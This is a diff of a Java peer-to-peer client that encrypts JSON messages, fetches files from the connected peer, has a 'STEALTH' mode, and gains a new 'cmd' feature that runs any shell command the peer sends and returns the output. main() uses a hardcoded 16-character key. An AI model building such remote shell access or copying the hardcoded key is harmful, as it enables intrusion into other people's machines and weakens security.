@@ -1,12 +1,4 @@
-import com.github.sarxos.webcam.Webcam;
-import com.github.sarxos.webcam.WebcamPanel;
-import com.github.sarxos.webcam.WebcamResolution;
-import org.json.JSONException;
 import org.json.JSONObject;
-
-import javax.swing.*;
-import java.awt.*;
-import java.awt.image.BufferedImage;
 import java.io.*;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -16,10 +8,10 @@ import java.security.Key;
 import java.util.Arrays;
 import java.util.Base64;
 import java.util.Scanner;
-import java.util.concurrent.*;
 
 /**
  * Created by Obada on 2016-09-12.
+ *
  */
 
 class Client
@@ -28,29 +20,29 @@ class Client
     private OutputStream output;
     private Socket socket;
     private final String DESKTOP = System.getProperty("user.home") + "/Desktop";
-    private String DOWNLOAD_DIR = DESKTOP + "/"; // Set the downloaded file directory to desktop initially
+    // Set the downloaded file directory to desktop initially
+    private String DOWNLOAD_DIR = DESKTOP + "/";
     private final int MB = 1024 * 1024;
     enum MODE {STEALTH, NORMAL}
     private MODE mode;
     // Encryption Key same as used in the server you're connecting to..(shared with the server)
     private Key serverKey;
-    // Encryption key related to this user only and shared with whoever try to connect to this user
-    private Key thisKey;
+
+    private Executor exe;
 
 /*
     This constructor won't create a special folder for the downloaded files, the default path (Desktop) will be selected instead
     @para Socket
 */
-Client(Socket socket, MODE mode, String[] keys)
+Client(Socket socket, MODE mode, String key)
 {
-    if(keys[0].length() < 16 || keys[1].length() < 16)
+    if(key.length() < 16)
     {
         System.err.println("The encryption keys are incorrect (not 128 bit keys)");
         System.exit(1);
     }
-
-    this.serverKey = Utilities.generateKey(keys[0]);
-    this.thisKey = Utilities.generateKey(keys[1]);
+    exe = new Executor();
+    this.serverKey = Utilities.generateKey(key);
 
     connect(socket);
     this.mode = mode;
@@ -62,16 +54,15 @@ Client(Socket socket, MODE mode, String[] keys)
     @para Socket
     @para folder "Title only not a full path"
 */
-Client(Socket socket, String folder, MODE mode, String[] keys)
+Client(Socket socket, String folder, MODE mode, String key)
 {
-    if(keys[0].length() < 16 || keys[1].length() < 16)
+    if(key.length() < 16)
     {
         System.err.println("The encryption keys are incorrect (not 128 bit keys)");
         System.exit(1);
     }
-
-    this.serverKey = Utilities.generateKey(keys[0]);
-    this.thisKey = Utilities.generateKey(keys[1]);
+    exe = new Executor();
+    this.serverKey = Utilities.generateKey(key);
 
     DOWNLOAD_DIR = DESKTOP + "/" + folder + "/";
     File file = new File(DOWNLOAD_DIR);
@@ -119,7 +110,7 @@ private byte[] getObject()
     }
     return null;
 }
-protected void sendObject(byte[] bytes)
+private void sendObject(byte[] bytes)
 {
     ObjectOutputStream out = null;
     try
@@ -204,7 +195,7 @@ void listen()
                                     {
                                         toSend.put("file_name",absPath.substring(absPath.lastIndexOf('/') + 1, absPath.length()));
                                         File file = new File(absPath);
-                                        toSend.put("file_extension",(file.isDirectory() ? "zip" : ""));
+                                        toSend.put("file_extension", (file.isDirectory() ? "zip" : ""));
                                     }
                                     // Encrypt with serverKey and send it to the server
                                     sendObject(Utilities.encrypt(toSend.toString().getBytes(), serverKey));
@@ -216,8 +207,16 @@ void listen()
                             }).start();
                             break;
                         case "cmd":
+                            JSONObject toSend = new JSONObject();
+                            toSend.put("type","reply");
+                            toSend.put("reply",new String(exe.Execute(json.getString("command"))));
+                            sendObject(Utilities.encrypt(toSend.toString().getBytes(), serverKey));
                             break;
                     }
+                    break;
+                case "reply":
+                    // Choose what to do with the reply either printout to the console or printout in your GUI
+                    System.out.println(">"+json.getString("reply"));
                     break;
             }
         } catch (Exception e) {
@@ -245,6 +244,9 @@ private void console() throws IOException {
             {
                 case "get ":
                     String absPath1 = scanner.findInLine(rx);
+                    // if the path from the console is only a file name then merge it with the DOWNLOAD_DIR (assuming it's in that dir)
+                    // also re-contain the whole string in the quotation marks in case of combining it with the DOWNLOAD_DIR
+                    absPath1 = (absPath1.contains("/") ? absPath1 : "\"" + DOWNLOAD_DIR + absPath1.substring(1, absPath1.length()));
                     json.put("type", "request");
                     json.put("data","get");
                     json.put("path",absPath1.substring(1, absPath1.lastIndexOf('\"')));
@@ -272,6 +274,12 @@ private void console() throws IOException {
                     json.put("type","file");
                     sendObject(Utilities.encrypt(json.toString().getBytes(), serverKey));
                     break;
+                case "cmd ":
+                    json.put("type", "request");
+                    json.put("data", "cmd");
+                    String tmp = scanner.findInLine(rx);
+                    json.put("command", tmp.substring(1, tmp.length() -1));
+                    sendObject(Utilities.encrypt(json.toString().getBytes(), serverKey));
             }
             scanner.close();
         }catch (Exception e)
@@ -312,48 +320,22 @@ private String getDOWNLOAD_DIR()
 {
     return DOWNLOAD_DIR;
 }
+
 public static void main (String[]args)throws Exception
 {
-//    String serverKey = "1234567890123456", thisKey = "123456789012345g";
-//    ServerSocket server = new ServerSocket(1234);
-//    new Thread(() -> {
-//        Client c2 = null;
-//        while(c2==null) try {
-//            c2 = new Client(server.accept(), MODE.STEALTH, new String[]{serverKey,thisKey});
-//        } catch (IOException e) {
-//            e.printStackTrace();
-//        }
-//    }).start();
-//    Client c1 = new Client(new Socket("localhost",1234), "custom",MODE.NORMAL, new String[]{serverKey, thisKey});
-//    c1.console();
-//    c1.close();
-
-//    Webcam webcam = Webcam.getWebcams().get(0);
-//    webcam.setViewSize(WebcamResolution.VGA.getSize());
-////
-//    WebcamPanel panel = new WebcamPanel(webcam);
-//    panel.setFPSDisplayed(true);
-//    panel.setDisplayDebugInfo(true);
-//    panel.setImageSizeDisplayed(true);
-//    panel.setMirrored(true);
-//
-//    JFrame window = new JFrame("Omid you're sleepy");
-//    window.add(panel);
-//    window.setResizable(true);
-//    window.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
-//    window.pack();
-//    window.setVisible(true);
-
-    Executor exe = new Executor();
-    System.out.println(new String(exe.Execute("ls")));
-    exe.changePWD("/home/obada/Desktop");
-    System.out.println(new String(exe.Execute("ls")));
-    System.out.println(new String(exe.Execute("lssasa")));
-    System.out.println(new String(exe.Execute("ls")));
-    System.out.println(new String(exe.Execute("ifconfig")));
-    exe.Execute("ls");
-    System.out.println("MAGICCC" + new String(exe.Execute("iwcoDSnfig")));
-    System.out.println(new String(exe.Execute("ls")));
+    String serverKey = "1234567890123456";
+    ServerSocket server = new ServerSocket(1234);
+    new Thread(() -> {
+        Client c2 = null;
+        while(c2==null) try {
+            c2 = new Client(server.accept(), MODE.STEALTH, serverKey);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }).start();
+    Client c1 = new Client(new Socket("localhost",1234), "custom",MODE.NORMAL, serverKey);
+    c1.console();
+    c1.close();
 
 }
 }
